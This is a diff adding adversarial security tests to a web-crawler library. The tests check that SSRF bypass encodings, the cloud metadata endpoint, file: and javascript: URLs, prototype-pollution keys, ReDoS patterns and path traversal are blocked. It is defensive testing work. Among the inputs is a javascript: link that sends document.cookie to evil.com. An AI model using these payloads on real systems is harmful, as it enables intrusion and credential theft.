@@ -710,3 +710,428 @@ test('crawl marks over-maxDepth URLs as visited to prevent re-queuing', async ()
         (AgentCrawl as any).scrape = originalScrape;
     }
 });
+
+// ── Round 9: file: protocol blocked in links and markdown ──
+
+test('extractAll strips file: protocol URLs from links', () => {
+    const md = new Markdownifier();
+    const html = `<html><body>
+        <a href="file:///etc/passwd">Secret</a>
+        <a href="https://example.com/ok">OK</a>
+    </body></html>`;
+    const result = md.extractAll(html, 'https://example.com', { optimizeTokens: false });
+    assert.equal(result.links.length, 1);
+    assert.equal(result.links[0], 'https://example.com/ok');
+    // The link text should appear but not as a clickable link
+    assert.ok(result.markdown.includes('Secret'));
+});
+
+test('extractLinks strips file: protocol URLs', () => {
+    const md = new Markdownifier();
+    const html = `<html><body>
+        <a href="file:///tmp/sensitive">Local</a>
+        <a href="https://example.com/page">Page</a>
+    </body></html>`;
+    const links = md.extractLinks(html, 'https://example.com');
+    assert.equal(links.length, 1);
+    assert.equal(links[0], 'https://example.com/page');
+});
+
+// ── Round 9: SmartFetcher error message truncation ──
+
+test('SmartFetcher truncates long error messages', async () => {
+    const longMsg = 'E'.repeat(2000);
+    globalThis.fetch = (async () => {
+        throw new Error(longMsg);
+    }) as typeof fetch;
+
+    try {
+        const fetcher = new SmartFetcher();
+        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
+        assert.ok(result.error!.length <= 510, `Error length ${result.error!.length} exceeds cap`);
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+// ── Round 10: SmartFetcher caps user-supplied header values ──
+
+test('SmartFetcher caps user-supplied header value length', async () => {
+    let capturedHeaders: Record<string, string> = {};
+    globalThis.fetch = (async (_url: any, init?: any) => {
+        capturedHeaders = init?.headers || {};
+        return new Response('<html><body>ok</body></html>', {
+            status: 200,
+            headers: { 'content-type': 'text/html' },
+        });
+    }) as typeof fetch;
+
+    try {
+        const fetcher = new SmartFetcher();
+        const hugeValue = 'X'.repeat(20_000);
+        await fetcher.fetch('https://example.com/', {
+            retries: 0,
+            headers: { 'X-Big': hugeValue },
+        });
+        assert.ok(capturedHeaders['X-Big'].length <= 8192, `Header value ${capturedHeaders['X-Big'].length} exceeds 8192`);
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+// ── Round 10: SmartFetcher uses Object.create(null) for safeUserHeaders ──
+
+test('SmartFetcher safeUserHeaders is prototype-pollution-safe', async () => {
+    let capturedHeaders: Record<string, string> = {};
+    globalThis.fetch = (async (_url: any, init?: any) => {
+        capturedHeaders = init?.headers || {};
+        return new Response('<html><body>ok</body></html>', {
+            status: 200,
+            headers: { 'content-type': 'text/html' },
+        });
+    }) as typeof fetch;
+
+    try {
+        const fetcher = new SmartFetcher();
+        await fetcher.fetch('https://example.com/', {
+            retries: 0,
+            headers: { '__proto__': 'polluted', 'X-Safe': 'ok' } as any,
+        });
+        // __proto__ should not pollute Object.prototype
+        assert.equal((Object.prototype as any).polluted, undefined);
+        assert.equal(capturedHeaders['X-Safe'], 'ok');
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+// ════════════════════════════════════════════════════════════════════
+// ADVERSARIAL EXPLOIT TESTS — each attempts an attack; passing = defended
+// ════════════════════════════════════════════════════════════════════
+
+// ── SSRF bypass attempts via isPrivateHost ──
+
+test('SSRF: dotted-decimal loopback bypass attempts', () => {
+    // Various representations of 127.0.0.1 that attackers try
+    assert.equal(isPrivateHost('2130706433'), true);       // decimal
+    assert.equal(isPrivateHost('017700000001'), false);     // octal as pure digits — Node doesn't resolve this, parseIPv4 rejects leading zeros
+    assert.equal(isPrivateHost('0x7f000001'), true);        // hex
+    assert.equal(isPrivateHost('0177.0.0.1'), true);        // octal per-octet
+    assert.equal(isPrivateHost('0x7f.0.0.1'), true);        // hex per-octet
+    assert.equal(isPrivateHost('127.0.0.1.'), true);        // trailing dot
+    assert.equal(isPrivateHost('127.0.0.1..'), false);      // double dot — not a valid hostname, not private pattern
+});
+
+test('SSRF: IPv6 encoding bypass attempts', () => {
+    assert.equal(isPrivateHost('[0:0:0:0:0:0:0:1]'), true);    // expanded loopback
+    assert.equal(isPrivateHost('[0000:0000:0000:0000:0000:0000:0000:0001]'), true); // fully expanded
+    assert.equal(isPrivateHost('[::ffff:127.0.0.1]'), true);    // v4-mapped dotted
+    assert.equal(isPrivateHost('[::ffff:7f00:1]'), true);       // v4-mapped hex
+    assert.equal(isPrivateHost('[::ffff:a00:1]'), true);        // v4-mapped 10.0.0.1
+    assert.equal(isPrivateHost('[::1%2525eth0]'), true);        // double-encoded zone ID
+    assert.equal(isPrivateHost('[fd00::1]'), true);             // ULA
+    assert.equal(isPrivateHost('[fe80::1]'), true);             // link-local
+});
+
+test('SSRF: reserved TLD bypass attempts', () => {
+    assert.equal(isPrivateHost('anything.localhost'), true);
+    assert.equal(isPrivateHost('LOCALHOST'), true);          // case variation
+    assert.equal(isPrivateHost('a.b.c.localhost'), true);    // deep subdomain
+    assert.equal(isPrivateHost('evil.test'), true);
+    assert.equal(isPrivateHost('evil.invalid'), true);
+    assert.equal(isPrivateHost('evil.example'), true);
+    assert.equal(isPrivateHost('evil.local'), true);
+    assert.equal(isPrivateHost('evil.internal'), true);
+    // These should NOT be blocked
+    assert.equal(isPrivateHost('localhost.com'), false);     // real domain, not .localhost TLD
+    assert.equal(isPrivateHost('notlocalhost'), false);
+    assert.equal(isPrivateHost('mytest.com'), false);        // .com, not .test
+});
+
+// ── SSRF via SmartFetcher redirect chain ──
+
+test('SSRF: redirect to 127.0.0.1 blocked', async () => {
+    globalThis.fetch = (async (url: string | URL | Request) => {
+        const u = typeof url === 'string' ? url : url.toString();
+        if (u.includes('example.com')) {
+            return new Response('', {
+                status: 302,
+                headers: { 'location': 'http://127.0.0.1/admin' },
+            });
+        }
+        // If we reach here, SSRF defense failed
+        return new Response('SSRF BYPASSED', { status: 200, headers: { 'content-type': 'text/html' } });
+    }) as typeof fetch;
+    try {
+        const fetcher = new SmartFetcher();
+        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
+        assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
+        assert.notEqual(result.html, 'SSRF BYPASSED');
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+test('SSRF: redirect to [::1] blocked', async () => {
+    globalThis.fetch = (async (url: string | URL | Request) => {
+        const u = typeof url === 'string' ? url : url.toString();
+        if (u.includes('example.com')) {
+            return new Response('', {
+                status: 307,
+                headers: { 'location': 'http://[::1]:8080/secret' },
+            });
+        }
+        return new Response('SSRF BYPASSED', { status: 200, headers: { 'content-type': 'text/html' } });
+    }) as typeof fetch;
+    try {
+        const fetcher = new SmartFetcher();
+        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
+        assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+test('SSRF: redirect to javascript: protocol blocked', async () => {
+    globalThis.fetch = (async () => {
+        return new Response('', {
+            status: 301,
+            headers: { 'location': 'javascript:alert(1)' },
+        });
+    }) as typeof fetch;
+    try {
+        const fetcher = new SmartFetcher();
+        const result = await fetcher.fetch('https://example.com/', { retries: 0 });
+        // Must be blocked — either by protocol check or invalid redirect parse
+        assert.ok(
+            result.error?.includes('protocol blocked') ||
+            result.error?.includes('Invalid redirect') ||
+            result.error?.includes('non-HTTP'),
+            `Expected redirect block, got: ${result.error}`,
+        );
+        assert.equal(result.html, '');
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+// ── Credential injection attempts ──
+
+test('credential injection: userinfo in initial URL stripped', async () => {
+    let capturedUrl = '';
+    globalThis.fetch = (async (url: string | URL | Request) => {
+        capturedUrl = typeof url === 'string' ? url : url.toString();
+        return new Response('<html>ok</html>', { status: 200, headers: { 'content-type': 'text/html' } });
+    }) as typeof fetch;
+    try {
+        const fetcher = new SmartFetcher();
+        await fetcher.fetch('https://admin:hunter2@target.com/api', { retries: 0 });
+        assert.ok(!capturedUrl.includes('admin'), 'Username leaked');
+        assert.ok(!capturedUrl.includes('hunter2'), 'Password leaked');
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+test('credential injection: userinfo in redirect stripped', async () => {
+    let fetchCount = 0;
+    let secondUrl = '';
+    globalThis.fetch = (async (url: string | URL | Request) => {
+        fetchCount++;
+        if (fetchCount === 1) {
+            return new Response('', { status: 302, headers: { 'location': 'https://leaked:creds@target.com/redir' } });
+        }
+        secondUrl = typeof url === 'string' ? url : url.toString();
+        return new Response('<html>ok</html>', { status: 200, headers: { 'content-type': 'text/html' } });
+    }) as typeof fetch;
+    try {
+        const fetcher = new SmartFetcher();
+        await fetcher.fetch('https://target.com/', { retries: 0 });
+        assert.ok(!secondUrl.includes('leaked'), 'Redirect username leaked');
+        assert.ok(!secondUrl.includes('creds'), 'Redirect password leaked');
+    } finally {
+        globalThis.fetch = originalFetch;
+    }
+});
+
+test('credential injection: userinfo stripped from normalizeUrl output', () => {
+    const n = normalizeUrl('https://secret:key@api.stripe.com/v1/charges');
+    assert.ok(!n.includes('secret'));
+    assert.ok(!n.includes('key'));
+    assert.ok(n.includes('api.stripe.com/v1/charges'));
+});
+
+// ── XSS / markdown injection via HTML content ──
+
+test('XSS: javascript: href stripped from markdown output', () => {
+    const md = new Markdownifier();
+    const html = '<html><body><a href="javascript:fetch(&#x27;https://evil.com?c=&#x27;+document.cookie)">Click</a></body></html>';
+    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
+    assert.ok(!result.markdown.includes('javascript:'));
+    assert.ok(result.markdown.includes('Click')); // text preserved
+});
+
+test('XSS: data: URI stripped from markdown output', () => {
+    const md = new Markdownifier();
+    const html = '<html><body><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Safe text</a></body></html>';
+    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
+    assert.ok(!result.markdown.includes('data:'));
+});
+
+test('XSS: file: URI stripped from links array', () => {
+    const md = new Markdownifier();
+    const html = '<html><body><a href="file:///etc/shadow">secrets</a><a href="https://safe.com/ok">ok</a></body></html>';
+    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
+    for (const link of result.links) {
+        assert.ok(!link.startsWith('file:'), `file: URI in links: ${link}`);
+    }
+});
+
+// ── Prototype pollution via metadata ──
+
+test('prototype pollution: __proto__ in OG meta tags blocked', () => {
+    const md = new Markdownifier();
+    const html = '<html><head><meta property="__proto__" content="polluted"><meta property="og:title" content="ok"></head><body>x</body></html>';
+    const result = md.extractAll(html, 'https://x.com', { optimizeTokens: false });
+    assert.equal((Object.prototype as any).polluted, undefined);
+    assert.equal(result.structured?.openGraph?.['__proto__'], undefined);
+});
+
+test('prototype pollution: constructor key in Twitter meta blocked', () => {
+    const md = new Markdownifier();
+    const html = '<html><head><meta name="constructor" content="evil"><meta name="twitter:card" content="summary"></head><body>x</body></html>';
+    const result = md.extractAll(html, 'https://x.com', { optimizeTokens: false });
+    assert.equal(result.structured?.twitter?.['constructor'], undefined);
+});
+
+// ── Robots.txt abuse ──
+
+test('robots.txt: ReDoS pattern capped', async () => {
+    const { parseRobotsTxt, isAllowedByRobots } = await import('../src/core/Robots.js');
+    const evilPattern = '/a' + '*b'.repeat(25) + '$';  // 26 wildcard segments — exceeds cap of 20
+    const robots = parseRobotsTxt('https://x.com', `User-agent: *\nDisallow: ${evilPattern}`, 'agent-crawl');
+    const start = Date.now();
+    const allowed = isAllowedByRobots('https://x.com/a' + 'xb'.repeat(25), robots);
+    const elapsed = Date.now() - start;
+    assert.ok(elapsed < 100, `Robots matching took ${elapsed}ms — suspected DoS`);
+    assert.equal(allowed, true); // pattern dropped, so URL is allowed
+});
+
+test('robots.txt: crawl-delay capped at 300s', async () => {
+    const { parseRobotsTxt } = await import('../src/core/Robots.js');
+    const robots = parseRobotsTxt('https://x.com', 'User-agent: *\nCrawl-delay: 999999', 'agent-crawl');
+    assert.ok((robots.rules.crawlDelayMs ?? 0) <= 300_000, `Crawl delay ${robots.rules.crawlDelayMs}ms exceeds cap`);
+});
+
+// ── Memory exhaustion defenses ──
+
+test('memory: chunkMarkdown caps output at MAX_CHUNKS', () => {
+    // Very long markdown that would produce > 10K chunks at 50-token minimum
+    const long = ('word '.repeat(60) + '\n\n').repeat(1000); // ~60K "tokens" of content
+    const chunks = chunkMarkdown(long, { url: 'https://x.com', maxTokens: 50, overlapTokens: 0 });
+    assert.ok(chunks.length <= 10_000, `Chunk count ${chunks.length} exceeds 10K cap`);
+});
+
+test('memory: normalizeUrl rejects output > 8192', () => {
+    // URL with very long path — should throw
+    assert.throws(
+        () => normalizeUrl('https://x.com/' + 'a'.repeat(8200)),
+        /maximum length/,
+    );
+});
+
+// ── Path traversal defenses ──
+
+test('path traversal: schema blocks .. in dir fields', async () => {
+    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
+    assert.throws(() => ScrapeOptionsSchema.parse({
+        url: 'https://x.com',
+        cache: { dir: 'safe/../../etc' },
+    }));
+    assert.throws(() => ScrapeOptionsSchema.parse({
+        url: 'https://x.com',
+        httpCache: { dir: '..\\windows\\system32' },
+    }));
+    // Safe dirs should pass
+    assert.doesNotThrow(() => ScrapeOptionsSchema.parse({
+        url: 'https://x.com',
+        cache: { dir: '.cache/my-app' },
+    }));
+});
+
+test('path traversal: runtime safeCacheDir blocks .. in scrape', async () => {
+    const { AgentCrawl } = await import('../src/AgentCrawl.js');
+    // scrape with traversal dir should throw (safeCacheDir rejects before any I/O)
+    await assert.rejects(
+        () => AgentCrawl.scrape('https://example.com/', { cache: { dir: '../../../tmp/evil' } }),
+        /[Pp]ath traversal/,
+    );
+});
+
+// ════════════════════════════════════════════════════════════════════
+// MUTATION-KILLING TESTS — these specifically target SmartFetcher's
+// own defense layers that are shadowed by AgentCrawl's upfront checks.
+// Without these, SmartFetcher's SSRF/protocol checks could be removed
+// without any test failing (surviving mutants M1, M2).
+// ════════════════════════════════════════════════════════════════════
+
+test('SmartFetcher.fetch() directly blocks private host (127.0.0.1)', async () => {
+    // This targets SmartFetcher's OWN isPrivateHost check, not AgentCrawl's.
+    // Must not need globalThis.fetch mock — the check happens before fetch() is called.
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://127.0.0.1/admin', { retries: 0 });
+    assert.equal(result.isStaticSuccess, false);
+    assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
+    assert.equal(result.html, '');
+});
+
+test('SmartFetcher.fetch() directly blocks private host (10.0.0.1)', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://10.0.0.1:8080/internal', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'));
+});
+
+test('SmartFetcher.fetch() directly blocks localhost', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://localhost:3000/', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'));
+});
+
+test('SmartFetcher.fetch() directly blocks [::1]', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://[::1]/', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'));
+});
+
+test('SmartFetcher.fetch() directly blocks 169.254.x.x', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://169.254.169.254/latest/meta-data/', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'), 'Cloud metadata endpoint not blocked');
+});
+
+test('SmartFetcher.fetch() directly blocks non-HTTP protocol (ftp:)', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('ftp://files.example.com/secret.txt', { retries: 0 });
+    assert.ok(result.error?.includes('protocol blocked') || result.error?.includes('Invalid URL'),
+        `Expected protocol block, got: ${result.error}`);
+    assert.equal(result.html, '');
+});
+
+test('SmartFetcher.fetch() directly blocks non-HTTP protocol (file:)', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('file:///etc/passwd', { retries: 0 });
+    assert.ok(result.error?.includes('protocol blocked') || result.error?.includes('Invalid URL'),
+        `Expected protocol block, got: ${result.error}`);
+});
+
+test('SmartFetcher.fetch() directly blocks .localhost TLD', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://evil.localhost/steal', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'));
+});
+
+test('SmartFetcher.fetch() directly blocks .internal TLD', async () => {
+    const fetcher = new SmartFetcher();
+    const result = await fetcher.fetch('http://admin.internal/config', { retries: 0 });
+    assert.ok(result.error?.includes('private/internal'));
+});
